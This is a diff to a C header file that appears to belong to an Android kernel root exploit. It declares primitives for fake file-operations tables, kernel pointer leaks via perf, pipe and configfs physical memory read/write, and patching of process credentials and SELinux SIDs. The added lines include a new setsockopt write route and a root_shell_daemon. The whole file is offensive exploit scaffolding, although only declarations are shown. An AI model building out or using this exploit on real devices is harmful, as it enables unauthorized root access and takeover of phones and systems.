@@ -240,6 +240,10 @@ extern uint64_t fake_right;
 extern uint64_t fake_left;
 extern uint64_t fake_fops;
 extern uint64_t binwrite_target;
+/* mode-4 PI-write triple for the setsockopt route (see prepare_skb_payload) */
+extern uint64_t ssopt_write_pc;
+extern uint64_t ssopt_write_right;
+extern uint64_t ssopt_write_left;
 extern int pselect_custom_write;
 extern uint64_t pselect_custom_target;
 extern uint64_t pselect_custom_value;
@@ -412,6 +416,7 @@ void clear_pselect_write(void);
 void put64(unsigned char *p, size_t off, uint64_t value);
 void put32(unsigned char *p, size_t off, uint32_t value);
 void put_fake_fops_table(unsigned char *p, size_t off);
+void ssopt_repair_fake_fops_page(void);
 int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len);
 int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos);
 int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len);
@@ -435,6 +440,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode);
 uintptr_t prepare_kernel_page(int payload_mode);
 uintptr_t prepare_good_kernel_page(int payload_mode);
 uintptr_t prepare_perf_fake_page(int payload_mode);
+/* read back a qword of the leaked fake page via its userspace mapping */
+uint64_t ssopt_page_readback(size_t off);
+int ssopt_perf_begin(void);
+void ssopt_set_waiter_lo(void);
+void ssopt_perf_drain(void);
+uint64_t ssopt_perf_result(void);
+void ssopt_perf_close(void);
+extern uint64_t ssopt_leaked_waiter;
 
 void fdset_put_word(fd_set *set, int word, uint64_t value);
 uint64_t fdset_get_word(const fd_set *set, int word);
@@ -515,6 +528,8 @@ uint64_t pipe_read64(int fd, uintptr_t direct_addr);
 uint32_t pipe_read32(int fd, uintptr_t direct_addr);
 int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value);
 int install_pipe_physrw(int fd);
+int install_configfs_physrw(int fd);
+extern int configfs_physrw;
 int install_umh_root(int fd);
 void handle_umh_mode(int argc, char **argv);
 void print_uname_line(const char *tag);
@@ -527,6 +542,7 @@ int patch_cred_identity(int fd, uintptr_t cred);
 int patch_cred_sid(int fd, uintptr_t cred);
 int patch_cred_object(int fd, uintptr_t cred);
 int install_android_root(int fd);
+void root_shell_daemon(void);
 
 #endif
 
